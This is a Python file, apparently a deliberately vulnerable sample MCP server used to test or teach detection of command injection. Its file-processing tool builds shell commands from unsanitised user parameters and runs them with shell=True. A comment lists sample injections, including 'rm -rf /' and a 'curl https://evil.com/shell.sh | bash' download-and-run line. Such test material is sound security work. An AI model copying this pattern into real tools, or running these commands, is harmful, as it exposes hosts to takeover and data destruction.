# Copyright 2025 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Example 9: Complex Template Command Injection with Dynamic Substitution"""
from mcp import FastMCP
from string import Template
import os
import subprocess

app = FastMCP("injection-attacks-service-9")

class FileProcessor:
    """Processes files with templated commands"""
    
    SCRIPT_TEMPLATES = {
        "convert": Template("convert $input_file $options $output_file"),
        "process": Template("$processor -i $input_file -o $output_file $flags"),
        "analyze": Template("$analyzer --input=$input_file --format=$format $extra_args"),
        "custom": Template("$command")
    }
    
    @staticmethod
    def build_command(template_name: str, variables: dict) -> str:
        """Build command from template and variables"""
        template = FileProcessor.SCRIPT_TEMPLATES.get(
            template_name, 
            FileProcessor.SCRIPT_TEMPLATES["custom"]
        )
        
        # VULNERABLE: Direct template substitution without sanitization
        try:
            command = template.substitute(**variables)
            return command
        except KeyError as e:
            # Use safe_substitute if keys are missing
            return template.safe_substitute(**variables)
    
    @staticmethod
    def execute_command(command: str, use_shell: bool = True,
                       timeout: int = 30) -> dict:
        """Execute command with optional shell"""
        if use_shell:
            # VULNERABLE: Shell execution with user-controlled command
            result = subprocess.run(command, shell=True, capture_output=True,
                                  text=True, timeout=timeout)
        else:
            # Still vulnerable if command contains shell metacharacters
            result = subprocess.run(command.split(), capture_output=True,
                                  text=True, timeout=timeout)
        
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }

@app.tool()
def process_file(filepath: str,
                processor: str = "cat",
                template_name: str = "process",
                output_file: str = "",
                options: str = "",
                extra_args: str = "") -> str:
    """
    Process file with custom script using templated commands.
    """
    file_processor = FileProcessor()
    
    # Build variables for template substitution
    variables = {
        "input_file": filepath,
        "output_file": output_file or f"{filepath}.processed",
        "processor": processor,
        "command": processor,
        "options": options,
        "flags": options,
        "extra_args": extra_args,
        "format": "json",
        "analyzer": processor
    }
    
    # VULNERABLE: Template injection through multiple parameters
    # User can inject: "file.txt; rm -rf / #" in filepath
    # Or: "cat; curl https://evil.com/shell.sh | bash #" in processor
    # Or: "&& malicious_command" in options/extra_args
    
    command = file_processor.build_command(template_name, variables)
    
    # Execute command
    result = file_processor.execute_command(command, use_shell=True)
    
    if result["returncode"] == 0:
        return f"Processing complete. Command executed: {command[:100]}..."
    else:
        return f"Processing failed: {result['stderr'][:200]}"
